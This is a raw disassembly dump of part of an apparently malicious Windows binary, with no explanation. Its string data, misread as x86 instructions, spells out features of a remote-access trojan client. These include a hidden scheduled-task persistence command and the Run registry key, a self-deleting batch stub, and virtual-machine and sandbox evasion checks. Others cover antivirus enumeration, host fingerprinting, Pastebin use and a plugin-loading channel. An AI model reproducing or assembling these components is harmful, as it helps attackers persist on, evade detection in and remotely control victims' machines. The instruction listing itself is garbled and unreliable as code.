  40b6d7:	71 00                	jno    0x40b6d9
  40b6d9:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b6dd:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b6e2:	09 6e 00             	or     %ebp,0x0(%esi)
  40b6e5:	75 00                	jne    0x40b6e7
  40b6e7:	6c                   	insb   (%dx),%es:(%edi)
  40b6e8:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b6ec:	01 00                	add    %eax,(%eax)
  40b6ee:	03 3a                	add    (%edx),%edi
  40b6f0:	00 00                	add    %al,(%eax)
  40b6f2:	0d 50 00 61 00       	or     $0x610050,%eax
  40b6f7:	63 00                	arpl   %eax,(%eax)
  40b6f9:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b6fc:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b700:	09 50 00             	or     %edx,0x0(%eax)
  40b703:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b709:	00 0f                	add    %cl,(%edi)
  40b70b:	4d                   	dec    %ebp
  40b70c:	00 65 00             	add    %ah,0x0(%ebp)
  40b70f:	73 00                	jae    0x40b711
  40b711:	73 00                	jae    0x40b713
  40b713:	61                   	popa
  40b714:	00 67 00             	add    %ah,0x0(%edi)
  40b717:	65 00 00             	add    %al,%gs:(%eax)
  40b71a:	07                   	pop    %es
  40b71b:	63 00                	arpl   %eax,(%eax)
  40b71d:	6d                   	insl   (%dx),%es:(%edi)
  40b71e:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b722:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b728:	00 73 00             	add    %dh,0x0(%ebx)
  40b72b:	63 00                	arpl   %eax,(%eax)
  40b72d:	68 00 74 00 61       	push   $0x61007400
  40b732:	00 73 00             	add    %dh,0x0(%ebx)
  40b735:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b738:	00 20                	add    %ah,(%eax)
  40b73a:	00 2f                	add    %ch,(%edi)
  40b73c:	00 63 00             	add    %ah,0x0(%ebx)
  40b73f:	72 00                	jb     0x40b741
  40b741:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b745:	74 00                	je     0x40b747
  40b747:	65 00 20             	add    %ah,%gs:(%eax)
  40b74a:	00 2f                	add    %ch,(%edi)
  40b74c:	00 66 00             	add    %ah,0x0(%esi)
  40b74f:	20 00                	and    %al,(%eax)
  40b751:	2f                   	das
  40b752:	00 73 00             	add    %dh,0x0(%ebx)
  40b755:	63 00                	arpl   %eax,(%eax)
  40b757:	20 00                	and    %al,(%eax)
  40b759:	6f                   	outsl  %ds:(%esi),(%dx)
  40b75a:	00 6e 00             	add    %ch,0x0(%esi)
  40b75d:	6c                   	insb   (%dx),%es:(%edi)
  40b75e:	00 6f 00             	add    %ch,0x0(%edi)
  40b761:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b765:	6e                   	outsb  %ds:(%esi),(%dx)
  40b766:	00 20                	add    %ah,(%eax)
  40b768:	00 2f                	add    %ch,(%edi)
  40b76a:	00 72 00             	add    %dh,0x0(%edx)
  40b76d:	6c                   	insb   (%dx),%es:(%edi)
  40b76e:	00 20                	add    %ah,(%eax)
  40b770:	00 68 00             	add    %ch,0x0(%eax)
  40b773:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b779:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b77d:	74 00                	je     0x40b77f
  40b77f:	20 00                	and    %al,(%eax)
  40b781:	2f                   	das
  40b782:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b786:	00 20                	add    %ah,(%eax)
  40b788:	00 22                	add    %ah,(%edx)
  40b78a:	00 00                	add    %al,(%eax)
  40b78c:	11 22                	adc    %esp,(%edx)
  40b78e:	00 20                	add    %ah,(%eax)
  40b790:	00 2f                	add    %ch,(%edi)
  40b792:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b796:	00 20                	add    %ah,(%eax)
  40b798:	00 27                	add    %ah,(%edi)
  40b79a:	00 22                	add    %ah,(%edx)
  40b79c:	00 01                	add    %al,(%ecx)
  40b79e:	13 22                	adc    (%edx),%esp
  40b7a0:	00 27                	add    %ah,(%edi)
  40b7a2:	00 20                	add    %ah,(%eax)
  40b7a4:	00 26                	add    %ah,(%esi)
  40b7a6:	00 20                	add    %ah,(%eax)
  40b7a8:	00 65 00             	add    %ah,0x0(%ebp)
  40b7ab:	78 00                	js     0x40b7ad
  40b7ad:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b7b3:	5c                   	pop    %esp
  40b7b4:	00 6e 00             	add    %ch,0x0(%esi)
  40b7b7:	75 00                	jne    0x40b7b9
  40b7b9:	52                   	push   %edx
  40b7ba:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b7be:	00 6f 00             	add    %ch,0x0(%edi)
  40b7c1:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b7c7:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b7cb:	74 00                	je     0x40b7cd
  40b7cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7ce:	00 65 00             	add    %ah,0x0(%ebp)
  40b7d1:	72 00                	jb     0x40b7d3
  40b7d3:	72 00                	jb     0x40b7d5
  40b7d5:	75 00                	jne    0x40b7d7
  40b7d7:	43                   	inc    %ebx
  40b7d8:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b7dc:	00 77 00             	add    %dh,0x0(%edi)
  40b7df:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7e0:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b7e4:	00 69 00             	add    %ch,0x0(%ecx)
  40b7e7:	57                   	push   %edi
  40b7e8:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b7ec:	00 66 00             	add    %ah,0x0(%esi)
  40b7ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7f0:	00 73 00             	add    %dh,0x0(%ebx)
  40b7f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7f4:	00 72 00             	add    %dh,0x0(%edx)
  40b7f7:	63 00                	arpl   %eax,(%eax)
  40b7f9:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b7ff:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b803:	61                   	popa
  40b804:	00 77 00             	add    %dh,0x0(%edi)
  40b807:	74 00                	je     0x40b809
  40b809:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b80d:	53                   	push   %ebx
  40b80e:	00 00                	add    %al,(%eax)
  40b810:	03 22                	add    (%edx),%esp
  40b812:	00 00                	add    %al,(%eax)
  40b814:	09 2e                	or     %ebp,(%esi)
  40b816:	00 62 00             	add    %ah,0x0(%edx)
  40b819:	61                   	popa
  40b81a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b81e:	13 40 00             	adc    0x0(%eax),%eax
  40b821:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b825:	68 00 6f 00 20       	push   $0x20006f00
  40b82a:	00 6f 00             	add    %ch,0x0(%edi)
  40b82d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b831:	00 1f                	add    %bl,(%edi)
  40b833:	74 00                	je     0x40b835
  40b835:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b83b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b83c:	00 75 00             	add    %dh,0x0(%ebp)
  40b83f:	74 00                	je     0x40b841
  40b841:	20 00                	and    %al,(%eax)
  40b843:	33 00                	xor    (%eax),%eax
  40b845:	20 00                	and    %al,(%eax)
  40b847:	3e 00 20             	add    %ah,%ds:(%eax)
  40b84a:	00 4e 00             	add    %cl,0x0(%esi)
  40b84d:	55                   	push   %ebp
  40b84e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b852:	15 53 00 54 00       	adc    $0x540053,%eax
  40b857:	41                   	inc    %ecx
  40b858:	00 52 00             	add    %dl,0x0(%edx)
  40b85b:	54                   	push   %esp
  40b85c:	00 20                	add    %ah,(%eax)
  40b85e:	00 22                	add    %ah,(%edx)
  40b860:	00 22                	add    %ah,(%edx)
  40b862:	00 20                	add    %ah,(%eax)
  40b864:	00 22                	add    %ah,(%edx)
  40b866:	00 00                	add    %al,(%eax)
  40b868:	07                   	pop    %es
  40b869:	43                   	inc    %ebx
  40b86a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b86e:	00 00                	add    %al,(%eax)
  40b870:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b874:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b878:	00 22                	add    %ah,(%edx)
  40b87a:	00 00                	add    %al,(%eax)
  40b87c:	0f 22 00             	mov    %eax,%cr0
  40b87f:	20 00                	and    %al,(%eax)
  40b881:	2f                   	das
  40b882:	00 66 00             	add    %ah,0x0(%esi)
  40b885:	20 00                	and    %al,(%eax)
  40b887:	2f                   	das
  40b888:	00 71 00             	add    %dh,0x0(%ecx)
  40b88b:	00 05 78 00 70 00    	add    %al,0x700078
  40b891:	00 45 53             	add    %al,0x53(%ebp)
  40b894:	00 65 00             	add    %ah,0x0(%ebp)
  40b897:	6c                   	insb   (%dx),%es:(%edi)
  40b898:	00 65 00             	add    %ah,0x0(%ebp)
  40b89b:	63 00                	arpl   %eax,(%eax)
  40b89d:	74 00                	je     0x40b89f
  40b89f:	20 00                	and    %al,(%eax)
  40b8a1:	2a 00                	sub    (%eax),%al
  40b8a3:	20 00                	and    %al,(%eax)
  40b8a5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8aa:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8ad:	20 00                	and    %al,(%eax)
  40b8af:	57                   	push   %edi
  40b8b0:	00 69 00             	add    %ch,0x0(%ecx)
  40b8b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8b4:	00 33                	add    %dh,(%ebx)
  40b8b6:	00 32                	add    %dh,(%edx)
  40b8b8:	00 5f 00             	add    %bl,0x0(%edi)
  40b8bb:	43                   	inc    %ebx
  40b8bc:	00 6f 00             	add    %ch,0x0(%edi)
  40b8bf:	6d                   	insl   (%dx),%es:(%edi)
  40b8c0:	00 70 00             	add    %dh,0x0(%eax)
  40b8c3:	75 00                	jne    0x40b8c5
  40b8c5:	74 00                	je     0x40b8c7
  40b8c7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8cb:	53                   	push   %ebx
  40b8cc:	00 79 00             	add    %bh,0x0(%ecx)
  40b8cf:	73 00                	jae    0x40b8d1
  40b8d1:	74 00                	je     0x40b8d3
  40b8d3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b8d7:	00 19                	add    %bl,(%ecx)
  40b8d9:	4d                   	dec    %ebp
  40b8da:	00 61 00             	add    %ah,0x0(%ecx)
  40b8dd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8de:	00 75 00             	add    %dh,0x0(%ebp)
  40b8e1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b8e5:	63 00                	arpl   %eax,(%eax)
  40b8e7:	74 00                	je     0x40b8e9
  40b8e9:	75 00                	jne    0x40b8eb
  40b8eb:	72 00                	jb     0x40b8ed
  40b8ed:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8f1:	00 2b                	add    %ch,(%ebx)
  40b8f3:	6d                   	insl   (%dx),%es:(%edi)
  40b8f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b8f7:	63 00                	arpl   %eax,(%eax)
  40b8f9:	72 00                	jb     0x40b8fb
  40b8fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8fc:	00 73 00             	add    %dh,0x0(%ebx)
  40b8ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40b900:	00 66 00             	add    %ah,0x0(%esi)
  40b903:	74 00                	je     0x40b905
  40b905:	20 00                	and    %al,(%eax)
  40b907:	63 00                	arpl   %eax,(%eax)
  40b909:	6f                   	outsl  %ds:(%esi),(%dx)
  40b90a:	00 72 00             	add    %dh,0x0(%edx)
  40b90d:	70 00                	jo     0x40b90f
  40b90f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b910:	00 72 00             	add    %dh,0x0(%edx)
  40b913:	61                   	popa
  40b914:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b918:	00 6f 00             	add    %ch,0x0(%edi)
  40b91b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b91c:	00 00                	add    %al,(%eax)
  40b91e:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b921:	6f                   	outsl  %ds:(%esi),(%dx)
  40b922:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b926:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b92a:	0f 56 00             	orps   (%eax),%xmm0
  40b92d:	49                   	dec    %ecx
  40b92e:	00 52 00             	add    %dl,0x0(%edx)
  40b931:	54                   	push   %esp
  40b932:	00 55 00             	add    %dl,0x0(%ebp)
  40b935:	41                   	inc    %ecx
  40b936:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b93a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b93f:	77 00                	ja     0x40b941
  40b941:	61                   	popa
  40b942:	00 72 00             	add    %dh,0x0(%edx)
  40b945:	65 00 00             	add    %al,%gs:(%eax)
  40b948:	15 56 00 69 00       	adc    $0x690056,%eax
  40b94d:	72 00                	jb     0x40b94f
  40b94f:	74 00                	je     0x40b951
  40b951:	75 00                	jne    0x40b953
  40b953:	61                   	popa
  40b954:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b958:	00 6f 00             	add    %ch,0x0(%edi)
  40b95b:	78 00                	js     0x40b95d
  40b95d:	00 17                	add    %dl,(%edi)
  40b95f:	53                   	push   %ebx
  40b960:	00 62 00             	add    %ah,0x0(%edx)
  40b963:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b969:	6c                   	insb   (%dx),%es:(%edi)
  40b96a:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b96e:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b972:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b976:	11 45 00             	adc    %eax,0x0(%ebp)
  40b979:	72 00                	jb     0x40b97b
  40b97b:	72 00                	jb     0x40b97d
  40b97d:	20 00                	and    %al,(%eax)
  40b97f:	48                   	dec    %eax
  40b980:	00 57 00             	add    %dl,0x0(%edi)
  40b983:	49                   	dec    %ecx
  40b984:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b988:	05 78 00 32 00       	add    $0x320078,%eax
  40b98d:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b993:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b999:	74 00                	je     0x40b99b
  40b99b:	49                   	dec    %ecx
  40b99c:	00 6e 00             	add    %ch,0x0(%esi)
  40b99f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9a3:	00 09                	add    %cl,(%ecx)
  40b9a5:	48                   	dec    %eax
  40b9a6:	00 57 00             	add    %dl,0x0(%edi)
  40b9a9:	49                   	dec    %ecx
  40b9aa:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9ae:	09 55 00             	or     %edx,0x0(%ebp)
  40b9b1:	73 00                	jae    0x40b9b3
  40b9b3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9b7:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b9bd:	00 13                	add    %dl,(%ebx)
  40b9bf:	4d                   	dec    %ebp
  40b9c0:	00 69 00             	add    %ch,0x0(%ecx)
  40b9c3:	63 00                	arpl   %eax,(%eax)
  40b9c5:	72 00                	jb     0x40b9c7
  40b9c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9c8:	00 73 00             	add    %dh,0x0(%ebx)
  40b9cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9cc:	00 66 00             	add    %ah,0x0(%esi)
  40b9cf:	74 00                	je     0x40b9d1
  40b9d1:	00 03                	add    %al,(%ebx)
  40b9d3:	20 00                	and    %al,(%eax)
  40b9d5:	00 09                	add    %cl,(%ecx)
  40b9d7:	54                   	push   %esp
  40b9d8:	00 72 00             	add    %dh,0x0(%edx)
  40b9db:	75 00                	jne    0x40b9dd
  40b9dd:	65 00 00             	add    %al,%gs:(%eax)
  40b9e0:	0b 36                	or     (%esi),%esi
  40b9e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b9e5:	62 00                	bound  %eax,(%eax)
  40b9e7:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40b9ed:	46                   	inc    %esi
  40b9ee:	00 61 00             	add    %ah,0x0(%ecx)
  40b9f1:	6c                   	insb   (%dx),%es:(%edi)
  40b9f2:	00 73 00             	add    %dh,0x0(%ebx)
  40b9f5:	65 00 00             	add    %al,%gs:(%eax)
  40b9f8:	0b 33                	or     (%ebx),%esi
  40b9fa:	00 32                	add    %dh,(%edx)
  40b9fc:	00 62 00             	add    %ah,0x0(%edx)
  40b9ff:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba05:	50                   	push   %eax
  40ba06:	00 61 00             	add    %ah,0x0(%ecx)
  40ba09:	74 00                	je     0x40ba0b
  40ba0b:	68 00 00 0f 56       	push   $0x560f0000
  40ba10:	00 65 00             	add    %ah,0x0(%ebp)
  40ba13:	72 00                	jb     0x40ba15
  40ba15:	73 00                	jae    0x40ba17
  40ba17:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba1d:	00 0b                	add    %cl,(%ebx)
  40ba1f:	41                   	inc    %ecx
  40ba20:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba24:	00 69 00             	add    %ch,0x0(%ecx)
  40ba27:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba28:	00 00                	add    %al,(%eax)
  40ba2a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba2e:	00 75 00             	add    %dh,0x0(%ebp)
  40ba31:	65 00 00             	add    %al,%gs:(%eax)
  40ba34:	0b 66 00             	or     0x0(%esi),%esp
  40ba37:	61                   	popa
  40ba38:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba3c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba3f:	00 17                	add    %dl,(%edi)
  40ba41:	50                   	push   %eax
  40ba42:	00 65 00             	add    %ah,0x0(%ebp)
  40ba45:	72 00                	jb     0x40ba47
  40ba47:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba4b:	72 00                	jb     0x40ba4d
  40ba4d:	6d                   	insl   (%dx),%es:(%edi)
  40ba4e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba51:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba52:	00 63 00             	add    %ah,0x0(%ebx)
  40ba55:	65 00 00             	add    %al,%gs:(%eax)
  40ba58:	11 50 00             	adc    %edx,0x0(%eax)
  40ba5b:	61                   	popa
  40ba5c:	00 73 00             	add    %dh,0x0(%ebx)
  40ba5f:	74 00                	je     0x40ba61
  40ba61:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40ba65:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40ba6b:	41                   	inc    %ecx
  40ba6c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba6f:	74 00                	je     0x40ba71
  40ba71:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40ba77:	72 00                	jb     0x40ba79
  40ba79:	75 00                	jne    0x40ba7b
  40ba7b:	73 00                	jae    0x40ba7d
  40ba7d:	00 13                	add    %dl,(%ebx)
  40ba7f:	49                   	dec    %ecx
  40ba80:	00 6e 00             	add    %ch,0x0(%esi)
  40ba83:	73 00                	jae    0x40ba85
  40ba85:	74 00                	je     0x40ba87
  40ba87:	61                   	popa
  40ba88:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ba8c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba8f:	64 00 00             	add    %al,%fs:(%eax)
  40ba92:	09 50 00             	or     %edx,0x0(%eax)
  40ba95:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba96:	00 6e 00             	add    %ch,0x0(%esi)
  40ba99:	67 00 00             	add    %al,(%bx,%si)
  40ba9c:	0b 47 00             	or     0x0(%edi),%eax
  40ba9f:	72 00                	jb     0x40baa1
  40baa1:	6f                   	outsl  %ds:(%esi),(%dx)
  40baa2:	00 75 00             	add    %dh,0x0(%ebp)
  40baa5:	70 00                	jo     0x40baa7
  40baa7:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40baad:	00 2b                	add    %ch,(%ebx)
  40baaf:	5c                   	pop    %esp
  40bab0:	00 72 00             	add    %dh,0x0(%edx)
  40bab3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bab4:	00 6f 00             	add    %ch,0x0(%edi)
  40bab7:	74 00                	je     0x40bab9
  40bab9:	5c                   	pop    %esp
  40baba:	00 53 00             	add    %dl,0x0(%ebx)
  40babd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bac1:	75 00                	jne    0x40bac3
  40bac3:	72 00                	jb     0x40bac5
  40bac5:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bacb:	43                   	inc    %ebx
  40bacc:	00 65 00             	add    %ah,0x0(%ebp)
  40bacf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bad0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bad4:	00 72 00             	add    %dh,0x0(%edx)
  40bad7:	32 00                	xor    (%eax),%al
  40bad9:	00 3d 53 00 65 00    	add    %bh,0x650053
  40badf:	6c                   	insb   (%dx),%es:(%edi)
  40bae0:	00 65 00             	add    %ah,0x0(%ebp)
  40bae3:	63 00                	arpl   %eax,(%eax)
  40bae5:	74 00                	je     0x40bae7
  40bae7:	20 00                	and    %al,(%eax)
  40bae9:	2a 00                	sub    (%eax),%al
  40baeb:	20 00                	and    %al,(%eax)
  40baed:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40baf1:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf2:	00 6d 00             	add    %ch,0x0(%ebp)
  40baf5:	20 00                	and    %al,(%eax)
  40baf7:	41                   	inc    %ecx
  40baf8:	00 6e 00             	add    %ch,0x0(%esi)
  40bafb:	74 00                	je     0x40bafd
  40bafd:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb03:	72 00                	jb     0x40bb05
  40bb05:	75 00                	jne    0x40bb07
  40bb07:	73 00                	jae    0x40bb09
  40bb09:	50                   	push   %eax
  40bb0a:	00 72 00             	add    %dh,0x0(%edx)
  40bb0d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb0e:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb12:	00 63 00             	add    %ah,0x0(%ebx)
  40bb15:	74 00                	je     0x40bb17
  40bb17:	00 17                	add    %dl,(%edi)
  40bb19:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb1d:	73 00                	jae    0x40bb1f
  40bb1f:	70 00                	jo     0x40bb21
  40bb21:	6c                   	insb   (%dx),%es:(%edi)
  40bb22:	00 61 00             	add    %ah,0x0(%ecx)
  40bb25:	79 00                	jns    0x40bb27
  40bb27:	4e                   	dec    %esi
  40bb28:	00 61 00             	add    %ah,0x0(%ecx)
  40bb2b:	6d                   	insl   (%dx),%es:(%edi)
  40bb2c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb2f:	00 07                	add    %al,(%edi)
  40bb31:	4e                   	dec    %esi
  40bb32:	00 2f                	add    %ch,(%edi)
  40bb34:	00 41 00             	add    %al,0x0(%ecx)
  40bb37:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb3d:	00 13                	add    %dl,(%ebx)
  40bb3f:	53                   	push   %ebx
  40bb40:	00 6f 00             	add    %ch,0x0(%edi)
  40bb43:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb48:	00 61 00             	add    %ah,0x0(%ecx)
  40bb4b:	72 00                	jb     0x40bb4d
  40bb4d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bb52:	09 70 00             	or     %esi,0x0(%eax)
  40bb55:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb56:	00 6e 00             	add    %ch,0x0(%esi)
  40bb59:	67 00 00             	add    %al,(%bx,%si)
  40bb5c:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bb61:	75 00                	jne    0x40bb63
  40bb63:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb67:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb68:	00 00                	add    %al,(%eax)
  40bb6a:	15 73 00 61 00       	adc    $0x610073,%eax
  40bb6f:	76 00                	jbe    0x40bb71
  40bb71:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bb75:	6c                   	insb   (%dx),%es:(%edi)
  40bb76:	00 75 00             	add    %dh,0x0(%ebp)
  40bb79:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb7d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb7e:	00 00                	add    %al,(%eax)
  40bb80:	07                   	pop    %es
  40bb81:	44                   	inc    %esp
  40bb82:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb86:	00 00                	add    %al,(%eax)
  40bb88:	15 73 00 65 00       	adc    $0x650073,%eax
  40bb8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb8e:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bb92:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb96:	00 67 00             	add    %ah,0x0(%edi)
  40bb99:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bb9f:	48                   	dec    %eax
  40bba0:	00 61 00             	add    %ah,0x0(%ecx)
  40bba3:	73 00                	jae    0x40bba5
  40bba5:	68 00 65 00 73       	push   $0x73006500
  40bbaa:	00 00                	add    %al,(%eax)
  40bbac:	09 48 00             	or     %ecx,0x0(%eax)
  40bbaf:	61                   	popa
  40bbb0:	00 73 00             	add    %dh,0x0(%ebx)
  40bbb3:	68 00 00 1b 50       	push   $0x501b0000
  40bbb8:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbbc:	00 67 00             	add    %ah,0x0(%edi)
  40bbbf:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bbc5:	50                   	push   %eax
  40bbc6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbca:	00 67 00             	add    %ah,0x0(%edi)
  40bbcd:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bbd3:	52                   	push   %edx
  40bbd4:	00 75 00             	add    %dh,0x0(%ebp)
  40bbd7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbd8:	00 00                	add    %al,(%eax)
  40bbda:	0f 4d 00             	cmovge (%eax),%eax
  40bbdd:	73 00                	jae    0x40bbdf
  40bbdf:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bbe3:	61                   	popa
  40bbe4:	00 63 00             	add    %ah,0x0(%ebx)
  40bbe7:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bbea:	11 52 00             	adc    %edx,0x0(%edx)
  40bbed:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bbf1:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bbf5:	76 00                	jbe    0x40bbf7
  40bbf7:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bbfc:	0b 45 00             	or     0x0(%ebp),%eax
  40bbff:	72 00                	jb     0x40bc01
  40bc01:	72 00                	jb     0x40bc03
  40bc03:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc04:	00 72 00             	add    %dh,0x0(%edx)
  40bc07:	00 47 6d             	add    %al,0x6d(%edi)
  40bc0a:	00 61 00             	add    %ah,0x0(%ecx)
  40bc0d:	73 00                	jae    0x40bc0f
  40bc0f:	74 00                	je     0x40bc11
  40bc11:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc15:	4b                   	dec    %ebx
  40bc16:	00 65 00             	add    %ah,0x0(%ebp)
  40bc19:	79 00                	jns    0x40bc1b
  40bc1b:	20 00                	and    %al,(%eax)
  40bc1d:	63 00                	arpl   %eax,(%eax)
  40bc1f:	61                   	popa
  40bc20:	00 6e 00             	add    %ch,0x0(%esi)
  40bc23:	20 00                	and    %al,(%eax)
  40bc25:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc26:	00 6f 00             	add    %ch,0x0(%edi)
  40bc29:	74 00                	je     0x40bc2b
  40bc2b:	20 00                	and    %al,(%eax)
  40bc2d:	62 00                	bound  %eax,(%eax)
  40bc2f:	65 00 20             	add    %ah,%gs:(%eax)
  40bc32:	00 6e 00             	add    %ch,0x0(%esi)
  40bc35:	75 00                	jne    0x40bc37
  40bc37:	6c                   	insb   (%dx),%es:(%edi)
  40bc38:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc3c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc3f:	72 00                	jb     0x40bc41
  40bc41:	20 00                	and    %al,(%eax)
  40bc43:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc47:	70 00                	jo     0x40bc49
  40bc49:	74 00                	je     0x40bc4b
  40bc4b:	79 00                	jns    0x40bc4d
